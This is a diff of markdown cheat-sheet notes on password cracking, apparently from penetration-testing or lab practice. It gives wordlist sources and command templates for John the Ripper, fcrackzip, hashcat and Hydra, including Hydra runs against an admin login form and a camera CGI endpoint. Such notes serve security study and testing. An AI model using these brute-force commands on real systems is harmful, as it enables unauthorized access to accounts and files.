@@ -1,25 +1,20 @@
-## Brute force 
-> multiply attempts to "crack" or have unathorize access to either a file or account etc. 
-
 ## Wordlist
-Seclist: https://github.com/danielmiessler/SecLists
-rockyou: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+- Seclist: https://github.com/danielmiessler/SecLists
+- rockyou: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 
 ```
+/usr/share/wordlists
 /usr/share/seclists/Passwords/darkweb2017-top1000.txt
-rockyou.txt
 ```
-
 
 ## John the Ripper
 > Take note, john the ripper only accepts .hash type files. 
 
 ```
+# converts the .zip file into a hash file 
 john2zip {.zip file} > {.hash file}
-```
-> converts the .zip file into a hash file 
 
-```
+# bruteforce
 john --wordlist={wordlist} {.hash file}
 john -show {.hash file}
 ```
@@ -28,11 +23,20 @@ john -show {.hash file}
 ```
 fcrackzip -u -v -D -p {wordlist} {.zip}
 ```
+
 ## Hydra
 ```
+# normal usage
 hydra -L {name} -P {wordlist} {IP} smb
+
+# website
+hydra -l fergus -P /usr/share/wordlists/ 10.10.10.191 http-post-form "/admin/:tokenCSRF=c2cdfb24e13671a2f17f334e3cac54af6ee96f42&username=^USER^&password=^PASS^&save=:Username or password incorrect"
+
+hydra -l admin -P 1000_common_passwords.txt -s 8090 -f 192.168.1.4 http-get /get_camera_params.cgi
 ```
-> take note there are SMB, SSH
+> - take note there are SMB, SSH
+> - need to find the error message for login 
+> - use burpsuite
 
 ## Crackmapexec 
 ```
@@ -63,7 +67,6 @@ https://github.com/frizb/Hashcat-Cheatsheet
 400 - sha256crypt $5$, SHA256(Unix)
 500 - md5crypt $1$, MD5(Unix)
 1800 - sha512crypt $6$, SHA512(Unix)
-
 ```
 > Linux hashes (/etc/shadow)
 
@@ -98,8 +101,6 @@ echo "change" >> potential.txt
 hashcat -a 6 potential.txt ?d?d?d --force --stdout > wordlist.txt
 ```
 > generate a wordlist out from the word "change" and appending digit rules. E.g. change000 change032 change321
-
-## Burpsuite
 
 
 
